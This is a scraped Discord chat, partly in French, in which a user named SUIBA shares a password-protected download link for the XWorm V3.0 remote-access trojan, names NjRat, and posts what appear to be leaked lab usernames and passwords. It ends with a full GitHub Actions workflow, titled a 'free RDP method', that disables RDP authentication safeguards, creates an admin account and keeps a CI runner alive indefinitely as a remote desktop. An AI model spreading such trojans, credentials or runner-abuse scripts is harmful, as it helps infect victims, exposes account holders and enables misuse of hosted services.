SUIBA
suiba_ra
Invisible

SUIBA

 — 26/12/2025 14:19
https://discord.gg/zHEuazBH
𝘾𝙖𝙥𝙞𝙩𝙖𝙣𝙤𝙨 𝙍𝙤𝙡𝙚𝙥𝙡𝙖𝙮 𝗩.𝟮 95%
𝘾𝙖𝙥𝙞𝙩𝙖𝙣𝙤𝙨 𝙍𝙤𝙡𝙚𝙥𝙡𝙖𝙮 𝗩.𝟮 95%
45 en ligne
116 membres
depuis nov. 2025
𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘛𝘰 𝘖𝘶𝘳 𝘙𝘰𝘭𝘦𝘱𝘭𝘢𝘺 𝘚𝘦𝘳𝘷𝘦𝘳👋
Grand Theft Auto V Legacy
Grand Theft Auto V Legacy
🌐
Clean Rp
🚀
Optimized server
🔵
𝗖𝗮𝗣𝗶𝘁𝗮𝗡𝗼𝘀 𝗥𝗽
+ 1 en plus

Aller sur le serveur
xGRABBERx — Hier à 14:38
WW
SUIBA

 — Hier à 14:39
Pa$$ : 1
L1nk : https://www.mediafire.com/file/092ngy89kv5ie0g/XWorm+V3.0.rar/file


@everyone
 x @here
MediaFire
XWorm V3.0
XWorm V3.0
SUIBA

 — Hier à 14:53
NjRat-0.7D
xGRABBERx — Hier à 15:03
Hm, it looks like that file might've been a virus. Instead of cooking up trouble, try cooking up a Spicy Italian Meatball: https://www.foodnetwork.com/recipes/ree-drummond/spicy-italian-meatballs.html 
Hm, it looks like that file might've been a virus. Instead of cooking up trouble, try cooking up a Spicy Italian Meatball: https://www.foodnetwork.com/recipes/ree-drummond/spicy-italian-meatballs.html 
Hm, it looks like that file might've been a virus. Instead of cooking up trouble, try cooking up a Chocolate Avocado Protein Smoothie: https://spinach4breakfast.com/chocolate-avocado-protein-smoothie/
https://www.mediafire.com/file/oxq1igh5whuulhu/CITISEN.rar/file
MediaFire
CITISEN
CITISEN
SUIBA

 — Hier à 22:07
student_04_6b80ca85d
+siw7?pY^0|,FZ.
SUIBA

 — Hier à 22:15
+siw7?pY^0|,FZ.
SUIBA

 — Hier à 22:36
student_02_cd28f16f2
SUIBA

 — 00:22
dWAn35Ru~m#62=_Q
SUIBA

 — 02:06
https://github.com/rayaneswiba-collab/RDP/actions/workflows/main.yml
GitHub
RDP · Workflow runs · rayaneswiba-collab/RDP
Contribute to rayaneswiba-collab/RDP development by creating an account on GitHub.
Contribute to rayaneswiba-collab/RDP development by creating an account on GitHub.
https://docs.google.com/document/d/1ask6e61qukvYY2BcYVbGQbwOHAZOqM_tqbp-7Atomgk/edit?tab=t.0
Google Docs
method free rdp by khalidfer
TAILSCALE_AUTH_KEY ___________________________________________ name: RDP on: workflow_dispatch: jobs: secure-rdp: runs-on: windows-latest timeout-minutes: 3600 steps: - name: Configure Core RDP Settings run: | # Enable Remote Desktop and disable Netw...
Image
https://login.tailscale.com/admin/settings/keys
https://tailscale.com/download/windows
Download | Tailscale
Tailscale is the zero configuration VPN that doesn't go through the public internet.
Download | Tailscale
SUIBA

 — 02:14
name: RDP

on:
  workflow_dispatch:

jobs:
Afficher plus
message.txt
5 Ko
﻿
xGRABBERx
fxsuiba_26855
xGRABBERx
name: RDP

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Configure Core RDP Settings
        run: |
          # Enable Remote Desktop and disable Network Level Authentication (if needed)
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
                             -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "SecurityLayer" -Value 0 -Force

          # Remove any existing rule with the same name to avoid duplication
          netsh advfirewall firewall delete rule name="RDP-Tailscale"
          
          # For testing, allow any incoming connection on port 3389
          netsh advfirewall firewall add rule name="RDP-Tailscale" `
            dir=in action=allow protocol=TCP localport=3389

          # (Optional) Restart the Remote Desktop service to ensure changes take effect
          Restart-Service -Name TermService -Force

      - name: Create RDP User with Secure Password
        run: |
          Add-Type -AssemblyName System.Security
          $charSet = @{
              Upper   = [char[]](65..90)      # A-Z
              Lower   = [char[]](97..122)     # a-z
              Number  = [char[]](48..57)      # 0-9
              Special = ([char[]](33..47) + [char[]](58..64) +
                         [char[]](91..96) + [char[]](123..126)) # Special characters
          }
          $rawPassword = @()
          $rawPassword += $charSet.Upper | Get-Random -Count 4
          $rawPassword += $charSet.Lower | Get-Random -Count 4
          $rawPassword += $charSet.Number | Get-Random -Count 4
          $rawPassword += $charSet.Special | Get-Random -Count 4
          $password = -join ($rawPassword | Sort-Object { Get-Random })
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          
          echo "RDP_CREDS=User: RDP | Password: $password" >> $env:GITHUB_ENV
          
          if (-not (Get-LocalUser -Name "RDP")) {
              Write-Error "User creation failed"
              exit 1
          }

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"
          
          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          Remove-Item $installerPath -Force

      - name: Establish Tailscale Connection
        run: |
          # Bring up Tailscale with the provided auth key and set a unique hostname
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
          
          # Wait for Tailscale to assign an IP
          $tsIP = $null
          $retries = 0
          while (-not $tsIP -and $retries -lt 10) {
              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
              Start-Sleep -Seconds 5
              $retries++
          }
          
          if (-not $tsIP) {
              Write-Error "Tailscale IP not assigned. Exiting."
              exit 1
          }
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
      
      - name: Verify RDP Accessibility
        run: |
          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
          
          # Test connectivity using Test-NetConnection against the Tailscale IP on port 3389
          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
          if (-not $testResult.TcpTestSucceeded) {
              Write-Error "TCP connection to RDP port 3389 failed"
              exit 1
          }
          Write-Host "TCP connectivity successful!"

      - name: Maintain Connection
        run: |
          Write-Host "`n=== RDP ACCESS ==="
          Write-Host "Address: $env:TAILSCALE_IP"
          Write-Host "Username: RDP"
          Write-Host "Password: $(echo $env:RDP_CREDS)"
          Write-Host "==================`n"
          
          # Keep runner active indefinitely (or until manually cancelled)
          while ($true) {
              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
              Start-Sleep -Seconds 300
          }
          
